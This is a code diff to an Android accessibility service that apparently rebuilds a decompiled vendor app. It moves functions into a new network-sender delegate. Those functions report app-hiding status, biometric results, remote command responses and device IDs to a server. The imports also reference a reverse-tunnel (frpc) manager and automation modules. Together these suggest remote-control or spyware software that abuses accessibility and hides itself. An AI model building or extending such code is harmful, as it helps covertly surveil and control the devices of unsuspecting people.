@@ -52,6 +52,7 @@ import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
 import com.storm.safe.rock.service.delegates.DetectionController
+import com.storm.safe.rock.service.delegates.NetworkMessageSender
 import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
 import com.storm.safe.rock.util.AssetConfigReader
@@ -323,6 +324,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Delegate: broadcast receiver registration/unregistration */
     internal var broadcastReceiverRegistry: BroadcastReceiverRegistry? = null
+
+    /** Delegate: network message sending (extracted sendHideStatus, sendBiometricResult, etc.) */
+    private var networkMessageSender: NetworkMessageSender? = null
 
     /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
     var accessibilityEventRouter: AccessibilityEventRouter? = null
@@ -663,6 +667,10 @@ class MyAccessibilityService : AccessibilityService() {
             )
             broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
             smartNavigator = SmartNavigator(this)
+            networkMessageSender = NetworkMessageSender(
+                networkManagerProvider = { networkManager },
+                deviceIdProvider = { getAndroidDeviceId() }
+            )
 
             // Step 4: Configure accessibility service info
             initServiceConfig()
@@ -3425,18 +3433,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211518l5 (l5), line 7835
      */
     fun sendScreenStatus() {
-        try {
-            val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
-            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
-            val isLocked = km?.isKeyguardLocked ?: false
-            val isScreenOn = pm?.isInteractive ?: true
-            android.util.Log.d(TAG, "📱 屏幕状态: isLocked=$isLocked, isScreenOn=$isScreenOn")
-            networkManager?.let { nm ->
-                // JADX: nm.sendScreenStatus(isLocked, isScreenOn)
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 发送屏幕状态更新失败", e)
-        }
+        networkMessageSender?.sendScreenStatus(keyguardManager, powerManager)
     }
 
     /**
@@ -3944,24 +3941,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211513l0 (l0), line 7717
      */
     fun sendHideStatus(message: String, isHidden: Boolean) {
-        try {
-            val nm = networkManager
-            if (nm == null || !nm.isConnected) {
-                android.util.Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送隐藏状态")
-                return
-            }
-            val data = JSONObject()
-            data.put("success", true)
-            data.put("isHidden", isHidden)
-            data.put("message", message)
-            data.put("timestamp", System.currentTimeMillis())
-            data.put("deviceId", getAndroidDeviceId())
-            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
-            nm.sendEvent("hide_app_result", data)
-            android.util.Log.d(TAG, "📤 应用隐藏结果已发送: isHidden=$isHidden, message=$message")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "发送应用隐藏结果失败", e)
-        }
+        networkMessageSender?.sendHideStatus(message, isHidden)
     }
 
     /**
@@ -3969,17 +3949,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211514l1 (l1), line 7743
      */
     fun sendBiometricResult(message: String, success: Boolean) {
-        try {
-            val nm = networkManager ?: return
-            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
-            val data = JSONObject()
-            data.put("success", success)
-            data.put("message", message)
-            data.put("timestamp", System.currentTimeMillis())
-            nm.sendEvent("biometric_result", data)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "发送生物识别结果失败", e)
-        }
+        networkMessageSender?.sendBiometricResult(message, success)
     }
 
     /**
@@ -3987,18 +3957,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211515l2 (l2), line 7760
      */
     fun sendCommandResponse(type: String, data: Map<String, Any>) {
-        try {
-            val nm = networkManager
-            if (nm == null || !nm.isConnected) return
-            val response = JSONObject()
-            response.put("type", type)
-            response.put("data", JSONObject(data))
-            response.put("timestamp", System.currentTimeMillis())
-            // JADX: c0267a0M211645b1.m211367a8(string) — raw WebSocket send
-            android.util.Log.d(TAG, "📤 发送命令响应: $type")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "发送命令响应失败", e)
-        }
+        networkMessageSender?.sendCommandResponse(type, data)
     }
 
     /**
@@ -4006,19 +3965,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211516l3 (l3), line 7781
      */
     fun sendDebugLog(message: String) {
-        try {
-            val nm = networkManager
-            if (nm == null || !nm.isConnected) return
-            val logData = JSONObject()
-            logData.put("type", "debug_log")
-            val inner = JSONObject()
-            inner.put("message", message)
-            inner.put("timestamp", System.currentTimeMillis())
-            logData.put("data", inner)
-            // JADX: raw WebSocket send
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "发送调试日志失败", e)
-        }
+        networkMessageSender?.sendDebugLog(message)
     }
 
     /**
@@ -4026,28 +3973,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211517l4 (l4), line 7804
      */
     fun sendDeviceEvent(eventData: JSONObject) {
-        try {
-            val nm = networkManager
-            if (nm == null || !nm.isConnected) {
-                android.util.Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送设备事件")
-                return
-            }
-            val eventWrapper = JSONObject()
-            eventWrapper.put("eventType", "logging_status")
-            eventWrapper.put("eventData", eventData)
-            eventWrapper.put("timestamp", System.currentTimeMillis())
-            val statusStr = "日志记录状态: " + if (eventData.optBoolean("enabled")) "已启用" else "已禁用"
-            val logData = JSONObject()
-            logData.put("deviceId", getAndroidDeviceId())
-            logData.put("logType", "SYSTEM_EVENT")
-            logData.put("content", statusStr)
-            logData.put("extraData", eventWrapper)
-            logData.put("timestamp", System.currentTimeMillis())
-            nm.sendOperationLog(logData)
-            android.util.Log.d(TAG, "📤 设备事件已通过操作日志通道发送: logging_status")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 发送设备事件失败", e)
-        }
+        networkMessageSender?.sendDeviceEvent(eventData)
     }
 
     // ════════════════════════════════════════════════════════════════
